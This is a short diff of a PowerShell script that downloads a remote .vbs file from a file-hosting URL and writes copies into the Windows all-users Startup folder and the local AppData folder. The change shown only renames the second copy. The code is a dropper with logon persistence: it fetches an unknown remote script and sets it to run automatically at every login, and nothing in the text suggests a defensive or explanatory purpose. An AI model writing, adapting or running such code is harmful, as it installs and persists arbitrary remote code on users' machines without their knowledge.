@@ -2,7 +2,7 @@ $url = "https://files.catbox.moe/9tn4y7.vbs"
 
 $destination1 = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9tn4y7.vbs"
 $localAppData = $env:LOCALAPPDATA
-$destination2 = Join-Path $localAppData "9lepqn.vbs"
+$destination2 = Join-Path $localAppData "9tn4y7.vbs"
 
 # Download to both locations
 Invoke-WebRequest -Uri $url -OutFile $destination1
